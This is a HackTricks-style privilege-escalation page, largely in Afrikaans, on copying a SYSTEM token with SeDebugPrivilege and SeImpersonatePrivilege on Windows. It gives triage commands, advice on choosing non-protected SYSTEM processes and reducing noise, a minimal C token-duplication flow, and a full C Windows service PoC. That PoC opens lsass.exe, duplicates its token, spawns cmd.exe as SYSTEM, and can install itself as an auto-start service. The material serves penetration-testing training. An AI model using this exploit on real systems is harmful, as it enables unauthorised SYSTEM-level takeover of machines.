# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy dek die **manual token-theft** variant waar ’n **High Integrity** konteks wat reeds **`SeDebugPrivilege`** en **`SeImpersonatePrivilege`** het, ’n geskikte **SYSTEM** proses oopmaak, sy token **duplicate**, en ’n nuwe proses met daardie token **spawn**.

As jy net ’n vinnige **SYSTEM** shell vanaf ’n bevoorregte admin proses nodig het, kyk ook:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

As jy **nie** ’n process-handle pad het nie maar jy **doen** het **`SeImpersonatePrivilege`**, is die **named-pipe / Potato** roete gewoonlik makliker:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

Voordat jy die token-copy pad probeer, bevestig dat die huidige proses reeds in ’n bruikbare konteks is:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes:

- **`SeDebugPrivilege`** is wat jou toelaat om baie **non-protected** SYSTEM-prosesse oop te maak selfs wanneer hul DACL jou normaalweg sou blokkeer.
- **`SeImpersonatePrivilege`** is wat **`CreateProcessWithTokenW`** daarna prakties maak.
- As die token-copy pad jou net ’n weak of filtered SYSTEM token gee, steel dit eenvoudig van ’n **ander SYSTEM-proses**.

## Kies die teikensproses sorgvuldig

Die tegniek word gewoonlik teen **`lsass.exe`** gewys, maar op moderne Windows is dit dikwels die **verkeerde teiken**:

- As **LSA Protection / RunAsPPL** geaktiveer is, is **`lsass.exe`** protected en ’n normale admin-proses met **`SeDebugPrivilege`** sal dit steeds nie kan oopmaak nie.
- Verkies **non-PPL SYSTEM-prosesse** soos **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, of ’n vroeë **`svchost.exe`**-instansie.
- **Protected processes** en sommige spesiale prosesse soos **`System`** of **`csrss.exe`** is nie realistiese user-mode teikens vir hierdie tegniek nie.
- Gebruik **Process Hacker / Process Explorer** wat verhoog loop om te verifieer of die teikentoken werklik die privileges het wat jy wil hê voordat jy dit dupliseer.

## API details wat in die praktyk saak maak

Baie publieke PoCs versoek **`PROCESS_ALL_ACCESS`** en **`TOKEN_ALL_ACCESS`**, maar dit is harder noisy as nodig. In die praktyk:

- Open die teikensproses met net die rights wat jy nodig het (gewoonlik **`PROCESS_QUERY_INFORMATION`** of **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Open die token met die rights wat nodig is vir proses-skep: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Gebruik **`DuplicateTokenEx(..., TokenPrimary, ...)`** om ’n **primary token** te skep; ’n impersonation token alleen is nie genoeg om ’n nuwe proses te skep nie.
- As **`CreateProcessWithTokenW`** faal met **`1314`**, skakel oor na **`CreateProcessAsUserW`**.
- As jy vanaf ’n **service / Session 0** begin, onthou dat **`CreateProcessWithTokenW`** die child in die **caller se session** hou. As jy ’n visible desktop shell nodig het, gebruik **`CreateProcessAsUserW`** en skuif die token na die verlangde session.

’n Minimal moderne flow lyk soos:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

Die volgende kode **exploiteer die regte `SeDebugPrivilege` en `SeImpersonatePrivilege`** om die token van 'n **process wat as SYSTEM loop** en met **al die token privileges** te kopieer. In hierdie geval kan die kode saamgestel en gebruik word as 'n **Windows service binary** om te verifieer dat die primitive werk.

Die hoofdeel van die **kode waar die privilege escalation plaasvind** is binne die **`Exploit`** function. Binne daardie function kan jy sien dat **`lsass.exe`** gesoek word, die **token gekopieer** word, en uiteindelik word daardie token gebruik om 'n nuwe **`cmd.exe`** te spawn met al die privileges van die gekopieerde token.

Op moderne hosts sal jy dikwels **`lsass.exe`** wil vervang met 'n ander **non-PPL SYSTEM process** soos **`winlogon.exe`**, **`wininit.exe`**, of **`services.exe`**.

Ander processes wat as SYSTEM loop met al of meeste van die token privileges is: **`services.exe`**, **`svchost.exe`** (sommige van die eerste ones), **`wininit.exe`**, **`csrss.exe`**... Onthou dat jy gewoonlik **nie 'n token van 'n protected process sal kan kopieer nie**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Verwysings

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
